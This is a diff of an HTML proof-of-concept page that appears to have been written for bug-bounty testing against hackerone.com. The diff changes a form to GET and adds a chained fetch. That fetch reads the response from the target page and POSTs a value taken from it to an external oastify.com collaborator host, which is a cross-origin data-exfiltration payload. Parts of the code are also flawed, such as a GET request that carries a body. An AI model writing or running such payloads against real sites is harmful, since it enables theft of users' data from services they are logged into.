@@ -1,44 +1,58 @@
 <html>
   <body>
-    <form id="myForm" method="POST" action="https://hackerone.com/stories-of-2024/new">
+    <form id="myForm" method="GET" action="https://hackerone.com/stories-of-2024/new">
       <input type="submit" value="Submit request" />
     </form>
 
     <script>
       // Intercept the form submission to capture the response
       document.getElementById("myForm").onsubmit = function(event) {
-        event.preventDefault();  // Prevent the form from submitting the usual way
+        //event.preventDefault();  // Prevent the form from submitting the usual way
 
-        // Create a FormData object to gather the form data
+        // Create FormData object to capture the form data
         const formData = new FormData(document.getElementById("myForm"));
 
-        // Send the form data using fetch with a fully qualified URL
+        // First fetch request
         fetch("https://hackerone.com/stories-of-2024/new", {
-          method: "POST",
+          method: "GET",
           body: formData,
         })
         .then((response) => {
           if (!response.ok) {
-            // Handle any HTTP errors (e.g., 404, 500)
             throw new Error("Network response was not ok");
           }
-          return response.json();  // Parse the response as JSON (adjust based on your server's response format)
+          return response.json();  // Parse the first response as JSON
         })
         .then((data) => {
-          // Capture and process the response data
-          console.log("Response data:", data);
+          console.log("First fetch response:", data);
 
-          // Now you can use the response data in further logic
-          // For example, you can use it to send a request to another endpoint
+          // Use the data from the first request to perform the second request
+          // (Assume the first response has some property `someValue` you want to send)
+          const secondRequestData = { valueFromFirstRequest: data.someValue };
+
+          // Second fetch request, nested inside the first one
+          return fetch("https://nypyiisl4k8l4hw8iq71b426exko8hw6.oastify.com", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(secondRequestData),
+          });
+        })
+        .then((secondResponse) => {
+          if (!secondResponse.ok) {
+            throw new Error("Second request failed");
+          }
+          return secondResponse.json();  // Parse the second response as JSON
+        })
+        .then((secondData) => {
+          console.log("Second fetch response:", secondData);
+          // Handle the second response data here
         })
         .catch((error) => {
-          // Handle any errors during the fetch request
-          console.error("There was a problem with the fetch operation:", error);
+          console.error("Error in fetch chain:", error);
         });
       };
-
-      // Optionally, trigger the form submission automatically (you can remove this if not needed)
-      // document.forms[0].submit();  // This will trigger the submit event and initiate the fetch logic
     </script>
   </body>
 </html>
